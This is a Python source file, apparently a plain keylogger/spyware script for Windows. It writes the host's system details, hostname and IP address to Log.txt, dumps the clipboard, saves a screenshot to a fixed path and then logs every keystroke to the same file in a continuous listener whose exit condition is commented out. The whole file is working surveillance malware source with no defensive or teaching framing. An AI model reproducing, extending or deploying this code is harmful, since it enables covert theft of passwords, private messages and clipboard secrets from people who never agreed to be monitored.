# Libraries
import socket, platform
import win32clipboard
import pyautogui
from pynput.keyboard import Listener


# Get Computer and Network Information
def device_information():
    with open("Log.txt", "a") as f:
        host = socket.gethostname()
        IP = socket.gethostbyname(host)

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Host Name: " + host + "\n")
        f.write("IP Address: " + IP + "\n")
        f.write("\n")


device_information()


# Gather clipboard contents
def copy_clipboard():
    with open("Log.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + data)
            f.write("\n")
            f.write("\n")

        except:
            f.write("Clipboard could not be copied.")
            f.write("\n")
            f.write("\n")


copy_clipboard()


# Screenshot functionalities
def screenshot():
    im = pyautogui.screenshot()
    im.save(r"D:\D\screenshot.png")


screenshot()


def on_press(key):
    keys = str(key).replace("'", "")

    if keys == "Key.space":
        keys = " "
    if keys == "Key.enter":
        keys = "\n"
    if keys == "Key.backspace":
        keys = "_"
    if keys == "Key.shift" or keys == "Key.shift_r" or keys == "Key.ctrl_r" or keys == "Key.ctrl_l" or keys == "Key.caps_lock" or keys == "Key.alt_l" or keys == "Key.alt_gr" or keys == "Key.tab" or keys == "Key.cmd":
        keys = ""

    print("{0} pressed".format(key))

    with open("Log.txt", "a") as o:
        o.write(keys)


def on_release(key):
    pass
#    if key == key.esc:
#        return False


with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
